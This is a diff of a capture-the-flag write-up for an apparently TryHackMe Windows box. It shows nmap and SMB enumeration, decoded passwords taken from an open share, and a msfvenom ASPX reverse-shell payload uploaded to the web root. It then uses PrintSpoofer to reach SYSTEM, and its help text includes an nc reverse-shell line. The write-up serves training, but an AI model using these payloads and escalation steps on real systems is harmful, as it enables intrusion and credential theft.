@@ -11,7 +11,7 @@ To make it easier first of all I performed a mass scan which dicovered below lis
       Discovered open port 49669/tcp on 10.10.28.239
 
 Interesting list of open ports. Let's do one better with nmap scanning the discovered ports to establish their services.
-
+------------------------------------------------------------------------------
 --> nmap -sC -sV -p80,445,135,139,49667,49669,49663,3389 -oA nmap/Relevent 10.10.28.239
     output:
 
@@ -69,4 +69,111 @@ Then I bruteforce for directory using dirsearch.py. But found nothing with that 
 --> sudo python3 /opt/dirsearch/-dirsearch.py -u http://10.10.28.239/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,html,apsx -x 404,403
 
 Let's, enumerate these ports and its running services, and which one is vulneable.
+------------------------------------------------------------------------------
+smbclient -L 10.10.83.165
+Enter WORKGROUP\su's password: 
 
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	nt4wrksv        Disk
+
+-------------------------------------------------------------------
+smbclient \\\\10.10.83.165\\nt4wrksv
+
+Enter WORKGROUP\su's password: 
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Sun Jul 26 03:16:04 2020
+  ..                                  D        0  Sun Jul 26 03:16:04 2020
+  passwords.txt                       A       98  Sat Jul 25 20:45:33 2020
+
+		7735807 blocks of size 4096. 4945728 blocks available
+smb: \> get passwords.txt
+getting file \passwords.txt of size 98 as passwords.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+
+------------------------------------------------------------------------------------
+
+echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
+Bob - !P@$$W0rD!123
+- - - - - - - - - - -
+echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
+Bill - Juw4nnaM4n420696969!$$$
+Got nothing from these credentials.
+--------------------------------------------------------------------------------------
+
+This password file is able to access where we can upload our exploit to get a reverse shell
+http://10.10.158.115:49663/nt4wrksv/password.txt
+
+--> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.45.62 LPORT=1234 -f aspx -o payload.aspx
+
+smb: \> put payload.aspx
+
+And finally we got foothold on the machine.
+
+c:\Users\Bob\Desktop>whoami /priv
+
+smb: \> put PrintSpoofer.exe
+
+09/22/2020  05:40 AM    <DIR>          ..
+07/25/2020  08:15 AM                98 passwords.txt
+09/22/2020  05:40 AM             3,423 payload.aspx
+09/22/2020  05:38 AM            27,136 PrintSpoofer.exe
+
+
+c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -h
+PrintSpoofer.exe -h
+
+PrintSpoofer v0.1 (by @itm4n)
+
+  Provided that the current user has the SeImpersonate privilege, this tool will leverage the Print
+  Spooler service to get a SYSTEM token and then run a custom command with CreateProcessAsUser()
+
+Arguments:
+  -c <CMD>    Execute the command *CMD*
+  -i          Interact with the new process in the current command prompt (default is non-interactive)
+  -d <ID>     Spawn a new process on the desktop corresponding to this session *ID* (check your ID with qwinsta)
+  -h          That's me :)
+
+Examples:
+  - Run PowerShell as SYSTEM in the current console
+      PrintSpoofer.exe -i -c powershell.exe
+  - Spawn a SYSTEM command prompt on the desktop of the session 1
+      PrintSpoofer.exe -d 1 -c cmd.exe
+  - Get a SYSTEM reverse shell
+      PrintSpoofer.exe -c "c:\Temp\nc.exe 10.10.13.37 1337 -e cmd"
+
+
+c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd
+PrintSpoofer.exe -i -c cmd
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>cd c:\Users\Administrator\Desktop
+cd c:\Users\Administrator\Desktop
+
+c:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is AC3C-5CB5
+
+ Directory of c:\Users\Administrator\Desktop
+
+07/25/2020  08:24 AM    <DIR>          .
+07/25/2020  08:24 AM    <DIR>          ..
+07/25/2020  08:25 AM                35 root.txt
+               1 File(s)             35 bytes
+               2 Dir(s)  20,272,693,248 bytes free
+
+c:\Users\Administrator\Desktop>type root.txt
+type root.txt
+THM{1fk5kf469devly1gl320zafgl345pv}
